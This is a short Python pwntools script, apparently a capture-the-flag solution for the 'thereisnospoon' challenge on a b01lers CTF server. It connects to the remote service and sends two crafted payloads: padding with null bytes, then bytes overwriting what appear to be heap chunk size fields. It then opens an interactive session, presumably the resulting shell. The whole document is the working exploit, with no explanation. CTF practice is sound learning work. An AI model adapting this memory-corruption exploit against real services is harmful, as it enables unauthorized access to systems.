from pwn import *

#p = process('./thereisnospoon-3b08fb627c71c8c2149d1e57d98a1934')
p = remote('chal.ctf.b01lers.com',1006)
p.recvuntil('matrix:')

payload ='A'*8+'\x00'*0x20
#gdb.attach(p)
p.send(payload)


p.recvuntil('choice: ')

payload = 'B'*0x18+p64(0x21)+p8(0x41)
p.send(payload)


p.interactive()